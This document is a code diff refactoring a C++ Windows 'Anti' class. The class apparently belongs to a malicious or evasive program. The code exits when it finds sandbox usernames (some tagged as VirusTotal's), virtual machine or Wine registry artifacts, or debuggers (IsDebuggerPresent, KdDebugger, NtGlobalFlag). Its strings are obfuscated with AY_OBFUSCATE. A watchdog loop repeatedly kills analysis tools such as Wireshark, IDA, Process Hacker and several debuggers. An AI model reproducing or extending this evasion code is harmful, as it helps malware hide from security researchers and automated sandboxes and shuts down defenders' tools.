@@ -2,7 +2,7 @@
 
 // Private funcs
 
-void Anti::toLowerCase(char* ptr, size_t size)
+void Anti::toLowerCase(char* ptr, const size_t size)
 {
 	for (uint32_t i = 0; i < size; i++) {
 		if (isupper(ptr[i]))
@@ -13,16 +13,14 @@ void Anti::toLowerCase(char* ptr, size_t size)
 BOOL Anti::IsWow64()
 {
 	BOOL bIsWow64 = FALSE;
-	LPFN_ISWOW64PROCESS fnIsWow64Process;
-	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
-	if (NULL != fnIsWow64Process) {
-		if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
-			return 0;
+	if (const auto fnIsWow64Process = reinterpret_cast<LPFN_ISWOW64PROCESS>(GetProcAddress(
+		GetModuleHandle(TEXT("kernel32")), "IsWow64Process")); nullptr != fnIsWow64Process && !fnIsWow64Process(GetCurrentProcess(), &bIsWow64)) {
+		return 0;
 	}
 	return bIsWow64;
 }
 
-void Anti::check_usernames()
+void Anti::check_usernames() const
 {
 	char szUsername[1024];
 	DWORD dwUser = sizeof(szUsername);
@@ -32,50 +30,40 @@ void Anti::check_usernames()
 	* Online Auto Analysis VM's use these windows usernames
 	*/
 
-	const char* user1 = AY_OBFUSCATE("george"); // <- Virus Total
-	if (strcmp(szUsername, user1) == 0)
+	if (const char* user1 = AY_OBFUSCATE("george"); strcmp(szUsername, user1) == 0) // <- Virus Total
 		exit(EXIT_FAILURE);
 
-	const char* user2 = AY_OBFUSCATE("JOHN-PC"); // <- Virus Total
-	if (strcmp(szUsername, user2) == 0)
+	if (const char* user2 = AY_OBFUSCATE("JOHN-PC"); strcmp(szUsername, user2) == 0) // <- Virus Total
 		exit(EXIT_FAILURE);
 
-	const char* user3 = AY_OBFUSCATE("Sandbox");
-	if (strcmp(szUsername, user3) == 0)
+	if (const char* user3 = AY_OBFUSCATE("Sandbox"); strcmp(szUsername, user3) == 0)
 		exit(EXIT_FAILURE);
 
-	const char* user4 = AY_OBFUSCATE("sand box");
-	if (strcmp(szUsername, user4) == 0)
+	if (const char* user4 = AY_OBFUSCATE("sand box"); strcmp(szUsername, user4) == 0)
 		exit(EXIT_FAILURE);
 
-	const char* user5 = AY_OBFUSCATE("John Doe");
-	if (strcmp(szUsername, user5) == 0)
+	if (const char* user5 = AY_OBFUSCATE("John Doe"); strcmp(szUsername, user5) == 0)
 		exit(EXIT_FAILURE);
 
-	const char* user6 = AY_OBFUSCATE("malware");
-	if (strcmp(szUsername, user6) == 0)
+	if (const char* user6 = AY_OBFUSCATE("malware"); strcmp(szUsername, user6) == 0)
 		exit(EXIT_FAILURE);
 
-	const char* user7 = AY_OBFUSCATE("Peter Wilson"); // <- Virus Total
-	if (strcmp(szUsername, user7) == 0)
+	if (const char* user7 = AY_OBFUSCATE("Peter Wilson"); strcmp(szUsername, user7) == 0)// <- Virus Total
 		exit(EXIT_FAILURE);
 
-	const char* user8 = AY_OBFUSCATE("virus");
-	if (strcmp(szUsername, user8) == 0)
+	if (const char* user8 = AY_OBFUSCATE("virus"); strcmp(szUsername, user8) == 0)
 		exit(EXIT_FAILURE);
 
-	const char* user9 = AY_OBFUSCATE("maltest");
-	if (strcmp(szUsername, user9) == 0)
+	if (const char* user9 = AY_OBFUSCATE("maltest"); strcmp(szUsername, user9) == 0)
 		exit(EXIT_FAILURE);
 
-	const char* user10 = AY_OBFUSCATE("CurrentUser");
-	if (strcmp(szUsername, user10) == 0)
+	if (const char* user10 = AY_OBFUSCATE("CurrentUser"); strcmp(szUsername, user10) == 0)
 		exit(EXIT_FAILURE);
 }
 
-inline HANDLE Anti::find_process(const char* process_name) const
+HANDLE Anti::find_process(const char* process_name)
 {
-	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+	const HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
 	PROCESSENTRY32 pEntry;
 	pEntry.dwSize = sizeof(pEntry);
 	BOOL hRes = Process32First(hSnapShot, &pEntry);
@@ -83,8 +71,7 @@ inline HANDLE Anti::find_process(const char* process_name) const
 	{
 		if (strcmp(pEntry.szExeFile, process_name) == 0)
 		{
-			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, pEntry.th32ProcessID);
-			if (hProcess != NULL)
+			if (const HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, pEntry.th32ProcessID); hProcess != nullptr)
 				return hProcess;
 		}
 		hRes = Process32Next(hSnapShot, &pEntry);
@@ -97,10 +84,8 @@ inline HANDLE Anti::find_process(const char* process_name) const
 
 void Anti::check_virtual_machine()
 {
-	std::string sysManufacturer, sysName;
 	char buf[1000];
 	DWORD sz = 1000;
-	int ret;
 
 	HKEY hKey1;
 	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("HARDWARE\\ACPI\\DSDT\\VBOX__"), 0, KEY_READ, &hKey1) == ERROR_SUCCESS)
@@ -115,12 +100,12 @@ void Anti::check_virtual_machine()
 	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("SOFTWARE\\Wine"), 0, KEY_READ, &hKey3) == ERROR_SUCCESS)
 		exit(EXIT_FAILURE);
 
-	ret = RegGetValueA(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("SYSTEM\\CurrentControlSet\\Control\\SystemInformation"), AY_OBFUSCATE("SystemManufacturer"),
-		RRF_RT_ANY, NULL, &buf[0], &sz);
+	int ret = RegGetValueA(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("SYSTEM\\CurrentControlSet\\Control\\SystemInformation"),
+		AY_OBFUSCATE("SystemManufacturer"),
+		RRF_RT_ANY, nullptr, &buf[0], &sz);
 
 	toLowerCase(buf, strlen(buf));
-	sysManufacturer = buf;
-	if (ret == ERROR_SUCCESS && (sysManufacturer.find(AY_OBFUSCATE("vmware")) != std::string::npos ||
+	if (std::string sysManufacturer = buf; ret == ERROR_SUCCESS && (sysManufacturer.find(AY_OBFUSCATE("vmware")) != std::string::npos ||
 		sysManufacturer.find(AY_OBFUSCATE("innotek gmbh")) != std::string::npos ||
 		sysManufacturer.find(AY_OBFUSCATE("qemu")) != std::string::npos ||
 		sysManufacturer.find(AY_OBFUSCATE("Apple inc.")) != std::string::npos ||
@@ -130,12 +115,11 @@ void Anti::check_virtual_machine()
 		exit(EXIT_FAILURE);
 
 	ret = RegGetValueA(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("SYSTEM\\CurrentControlSet\\Control\\SystemInformation"), AY_OBFUSCATE("SystemProductName"),
-		RRF_RT_ANY, NULL, &buf[0], &sz);
+		RRF_RT_ANY, nullptr, &buf[0], &sz);
 
 	toLowerCase(buf, strlen(buf));
-	sysName = buf;
 
-	if (ret == ERROR_SUCCESS && (sysName.find(AY_OBFUSCATE("vmware")) != std::string::npos ||
+	if (std::string sysName = buf; ret == ERROR_SUCCESS && (sysName.find(AY_OBFUSCATE("vmware")) != std::string::npos ||
 		sysName.find(AY_OBFUSCATE("virtualbox")) != std::string::npos ||
 		sysName.find(AY_OBFUSCATE("parallel")) != std::string::npos ||
 		sysName.find(AY_OBFUSCATE("qemu")) != std::string::npos ||
@@ -151,9 +135,8 @@ void Anti::check_debugging()
 	if (IsDebuggerPresent())
 		exit(EXIT_FAILURE);
 	// Check 2
-	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
-	bool is_debugging = false;
-	CheckRemoteDebuggerPresent(processHandle, reinterpret_cast<PBOOL>(is_debugging));
+	BOOL is_debugging;
+	CheckRemoteDebuggerPresent(GetCurrentProcess(), &is_debugging);
 	if (is_debugging)
 		exit(EXIT_FAILURE);
 	// Check 3
@@ -180,43 +163,40 @@ void Anti::check_debugging()
 
 	// Check 6
 	// KD debug check
-	const ULONG_PTR UserSharedData = 0x7FFE0000;
-	const UCHAR KdDebuggerEnabledByte = *(UCHAR*)(UserSharedData + 0x2D4);
+	constexpr ULONG_PTR UserSharedData = 0x7FFE0000;
+	const UCHAR KdDebuggerEnabledByte = *reinterpret_cast<UCHAR*>((UserSharedData + 0x2D4));
 	const BOOLEAN KdDebuggerEnabled = (KdDebuggerEnabledByte & 0x1) == 0x1;
-	const BOOLEAN KdDebuggerNotPresent = (KdDebuggerEnabledByte & 0x2) == 0;
-	if (KdDebuggerEnabled || !KdDebuggerNotPresent) 
+	if (const BOOLEAN KdDebuggerNotPresent = (KdDebuggerEnabledByte & 0x2) == 0; KdDebuggerEnabled || !KdDebuggerNotPresent)
 		exit(EXIT_FAILURE);
 
-	PDWORD pNtGlobalFlag = NULL, pNtGlobalFlagWoW64 = NULL;
-	BYTE* _teb32 = (BYTE*)__readfsdword(0x18);
-	DWORD _peb32 = *(DWORD*)(_teb32 + 0x30);
-	pNtGlobalFlag = (PDWORD)(_peb32 + 0x68);
+	PDWORD pNtGlobalFlagWoW64 = nullptr;
+	const auto _teb32 = reinterpret_cast<BYTE*>(__readfsdword(0x18));
+	const DWORD _peb32 = *reinterpret_cast<DWORD*>(_teb32 + 0x30);
+	PDWORD pNtGlobalFlag = reinterpret_cast<PDWORD>(_peb32 + 0x68);
 	if (this->IsWow64())
 	{
-		BYTE* _teb64 = (BYTE*)__readfsdword(0x18) - 0x2000;
-		DWORD64 _peb64 = *(DWORD64*)(_teb64 + 0x60);
-		pNtGlobalFlagWoW64 = (PDWORD)(_peb64 + 0xBC);
+		BYTE* _teb64 = reinterpret_cast<BYTE*>(__readfsdword(0x18)) - 0x2000;
+		const DWORD64 _peb64 = *reinterpret_cast<DWORD64*>(_teb64 + 0x60);
+		pNtGlobalFlagWoW64 = reinterpret_cast<PDWORD>(_peb64 + 0xBC);
 	}
 
-	BOOL normalDetected = pNtGlobalFlag && *pNtGlobalFlag & 0x00000070;
-	BOOL wow64Detected = pNtGlobalFlagWoW64 && *pNtGlobalFlagWoW64 & 0x00000070;
-	if (normalDetected || wow64Detected)
+	const BOOL normalDetected = pNtGlobalFlag && *pNtGlobalFlag & 0x00000070;
+	if (const BOOL wow64Detected = pNtGlobalFlagWoW64 && *pNtGlobalFlagWoW64 & 0x00000070; normalDetected || wow64Detected)
 		exit(EXIT_FAILURE);
 }
 
 void Anti::check_analyzing()
 {
-	HMODULE hKernel32;
-	hKernel32 = GetModuleHandle("kernel32.dll");
-	if (hKernel32 == NULL)
-	        exit(EXIT_FAILURE);
-	if (GetProcAddress(hKernel32, AY_OBFUSCATE("wine_get_unix_file_name")) != NULL)
+	const HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
+	if (hKernel32 == nullptr)
+		exit(EXIT_FAILURE);
+	if (GetProcAddress(hKernel32, AY_OBFUSCATE("wine_get_unix_file_name")) != nullptr)
 		exit(EXIT_FAILURE);
 
 	// Kill all blacklisted processes (ONCE)
 	for (auto const& process : this->processes) {
-		HANDLE proc = find_process(process);
-		if (proc != NULL) {
+		const HANDLE proc = find_process(process);
+		if (proc != nullptr) {
 			CloseHandle(proc);
 			exit(EXIT_FAILURE);
 		}
@@ -228,8 +208,8 @@ void Anti::check_analyzing()
 void Anti::watch_dog()
 {
 	while (true) {
-		for (auto process : this->processes) {
-			HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+		for (const auto& process : this->processes) {
+			const HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
 			PROCESSENTRY32 pEntry;
 			pEntry.dwSize = sizeof(pEntry);
 			BOOL hRes = Process32First(hSnapShot, &pEntry);
@@ -237,8 +217,7 @@ void Anti::watch_dog()
 			{
 				if (strcmp(pEntry.szExeFile, process) == 0)
 				{
-					HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, pEntry.th32ProcessID);
-					if (hProcess != NULL)
+					if (const HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, pEntry.th32ProcessID); hProcess != nullptr)
 					{
 						TerminateProcess(hProcess, 9);
 						CloseHandle(hProcess);
@@ -257,10 +236,10 @@ Anti::Anti(bool& check_virtual_machine, bool& check_debugging, bool& check_analy
 {
 	this->check_usernames(); // Top Priority
 
-	if (check_virtual_machine) 
+	if (check_virtual_machine)
 		this->check_virtual_machine();
 
-	if (check_debugging) 
+	if (check_debugging)
 		this->check_debugging();
 
 	if (check_analyzing) {
@@ -287,8 +266,8 @@ Anti::Anti(bool& check_virtual_machine, bool& check_debugging, bool& check_analy
 		const char* cheat_engine2 = AY_OBFUSCATE("cheatengine-x86_64-SSE4-AVX2.exe");
 		//Note: Dangerous game to be played if task manager is added to the vector :)
 		//const char* taskmgr = AY_OBFUSCATE("Taskmgr.exe");
-		this->processes = { procmon, ollydbg, x32dbg, glasswire, mmc, wireshark, fiddler, netlimiter, 
-			cheat_engine1, ida, vm_proc1, vm_proc2, http_debugger, windbg, dumpcap, process_hacker, cutter, 
+		this->processes = { procmon, ollydbg, x32dbg, glasswire, mmc, wireshark, fiddler, netlimiter,
+			cheat_engine1, ida, vm_proc1, vm_proc2, http_debugger, windbg, dumpcap, process_hacker, cutter,
 			immunity_debugger, binary_ninja, cheat_engine2 }; // taskmgr
 		this->check_analyzing();
 	}
